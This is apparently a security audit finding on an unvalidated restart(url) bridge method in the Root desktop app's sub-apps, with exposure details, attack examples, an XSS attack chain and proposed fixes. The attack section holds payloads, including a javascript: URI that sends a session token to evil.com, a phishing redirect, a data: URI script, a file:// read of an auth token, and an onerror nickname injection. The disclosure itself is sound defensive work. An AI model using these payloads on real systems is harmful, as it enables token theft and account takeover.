# C5. restart(url) — Open Redirect & JavaScript URI Execution

**Severity**: CRITICAL
**Affected**: All 7 sub-app bundles (Raid Planner, Tasks, Polls, Suggestions, Minecraft, Stickerwall, Hexatris)
**Lines**: ~35630-35632 (implementation), ~35094-35095 (wrapper)
**Root Cause**: `window.location.href = attacker_url` with zero validation

---

## What It Is

Every sub-app in Root ships a `restart(url)` method on the SDK bridge. When called, it navigates the entire application window to whatever URL you pass it. There is no scheme check, no domain allowlist, no validation of any kind.

```javascript
// The actual production code (minified, cleaned up):
restart(e$9) {
    e$9 ? window.location.href = e$9 : window.location.reload();
}
```

That's it. One line. `window.location.href = attacker_string`.

---

## How It's Exposed

The method is reachable from four global entry points, all accessible to any JavaScript running in the DotNetBrowser context:

```
window.__rootSdkBridgeWebToNative.restart(url)   // Native bridge
window.__rootSdkBridgeDev.restart(url)            // Dev bridge (same object)
window.rootSdk.lifecycle.restart(url)             // Public SDK API
window.parent.__rootSdkBridgeWebToNative.restart(url)  // From child iframes
```

The bridge assignment happens unconditionally:

```javascript
window.__rootSdkBridgeWebToNative.restart ||
    (window.__rootSdkBridgeWebToNative.restart = (t) => sdk.restart(t))
```

No origin check. No caller validation. Any code in the page calls it.

---

## What An Attacker Can Do

### 1. Execute Arbitrary JavaScript

```javascript
window.__rootSdkBridgeWebToNative.restart(
    "javascript:fetch('https://evil.com/steal?t='+sessionStorage.getItem('__rootUser'))"
)
```

The `javascript:` scheme executes in the app's full security context. The attacker gets:
- Bearer token (from bridge initialization or memory)
- `__rootUser` sessionStorage (userId, deviceId, nickname, roles)
- Full bridge access to all 27 gRPC backend services
- Admin bridge methods: `kickPeer()`, `setAdminMute()`, `setAdminDeafen()`

### 2. Phishing via Open Redirect

```javascript
window.__rootSdkBridgeWebToNative.restart("https://evil.com/root-login.html")
```

The app window navigates to a pixel-perfect fake login page. The user thinks Root crashed and re-enters credentials. The DotNetBrowser window has no URL bar — the user cannot see where they actually are.

### 3. Data URI Code Injection

```javascript
window.__rootSdkBridgeWebToNative.restart(
    "data:text/html,<script>document.write(document.cookie)</script>"
)
```

Renders attacker HTML directly in the app window.

### 4. Local File Exposure

```javascript
window.__rootSdkBridgeWebToNative.restart(
    "file:///C:/Users/" + username + "/AppData/Local/Root Communications/Root/profile/default/Store/AuthToken"
)
```

Attempts to navigate to local files. Combined with DotNetBrowser's `--disable-web-security` flag, this may succeed.

---

## The Attack Chain

An attacker doesn't call `restart()` directly — they trigger it through one of the existing XSS vectors:

```
Step 1: Exploit H3 (innerHTML XSS via nickname in DevBar)
        └─ Set nickname to: <img src=x onerror="__rootSdkBridgeWebToNative.restart('javascript:...')">

Step 2: Victim opens any sub-app with DevBar (5 of 7 apps have it)
        └─ DevBar renders nickname via innerHTML (no sanitization)

Step 3: onerror fires → restart() called with javascript: URI
        └─ window.location.href = "javascript:..." executes

Step 4: Attacker JS runs in app context
        └─ Steals Bearer token, exfiltrates to attacker server
        └─ Calls RefreshToken to lock victim out (M26)
        └─ Has exclusive API access to victim's account
```

Or via the Stickerwall Fabric.js vector (M23):

```
Step 1: Create sticker with canvas_json containing malicious Image src
Step 2: Image loads → triggers error → XSS in sticker rendering context
Step 3: XSS calls restart("javascript:...") on parent bridge
Step 4: Full app compromise
```

---

## Why It's Worse Than A Normal Open Redirect

| Factor | Impact |
|--------|--------|
| **No URL bar** | DotNetBrowser has no address bar — user can't see the redirect happened |
| **`--disable-web-security`** | Chromium runs with web security disabled — `file://` and cross-origin may work |
| **Bridge access** | JavaScript execution in this context gives access to the entire native bridge |
| **Token in memory** | Bearer token is in JS memory — `javascript:` URI can read it immediately |
| **All 7 apps** | Every sub-app is an entry point — attacker just needs XSS in any one of them |
| **No CSP** | No Content-Security-Policy headers on any page (M3) — nothing blocks `javascript:` navigation |

---

## Affected Files

| App | Bundle | Version |
|-----|--------|---------|
| Raid Planner | `index-BG-RjBRK.js` | 0.4.11 |
| Task Tracker | `index-C1Uj-njt.js` | 0.4.5 |
| Polls | `index-f7am85W4.js` | 0.4.17 |
| Suggestions | `index-CmreXcFe.js` | 0.4.4 |
| Minecraft | `index-Ct4GOtmZ.js` | 0.4.5 |
| Stickerwall | `index-Dg0hJEdq.js` | 0.4.8 |
| Hexatris | `index-VcQt9H-b.js` | 0.4.2 |

All bundles share the same RootSDK code (lines ~34500-35700), so the vulnerability is identical across all seven.

---

## The Fix

**Minimum** (scheme allowlist):
```javascript
restart(url) {
    if (!url) { window.location.reload(); return; }
    if (!/^https?:\/\//i.test(url)) return;  // Block javascript:, data:, file:, etc.
    window.location.href = url;
}
```

**Better** (domain allowlist + scheme check):
```javascript
restart(url) {
    if (!url) { window.location.reload(); return; }
    try {
        const parsed = new URL(url);
        if (parsed.protocol !== 'https:') return;
        if (!parsed.hostname.endsWith('.rootapp.com')) return;
        window.location.href = url;
    } catch { return; }
}
```

**Best**: Remove `restart(url)` entirely. Use `window.location.reload()` for the reload case. If the native app needs to navigate the webview, do it from the .NET side via DotNetBrowser's navigation API, not from JS.

---

## Relationship to Other Findings

| Finding | How It Connects |
|---------|----------------|
| **H3** (innerHTML XSS) | Provides the trigger — XSS in DevBar nickname → calls restart() |
| **H10** (bridge has no auth) | restart() is just one of many unprotected bridge methods |
| **H12** (sessionStorage poisoning) | javascript: URI can read/write __rootUser to impersonate |
| **M3** (no CSP) | CSP would block javascript: navigation — but there is none |
| **M6** (modifiable local JS) | Attacker can also just edit the JS on disk to add restart() calls |
| **M23** (Fabric.js loadFromJSON) | Another XSS entry point that chains into restart() |
| **M26** (token refresh DoS) | After stealing token via restart(), attacker locks victim out |
| **C1** (hardcoded token) | Shows what an attacker gets with JS execution — full API access |
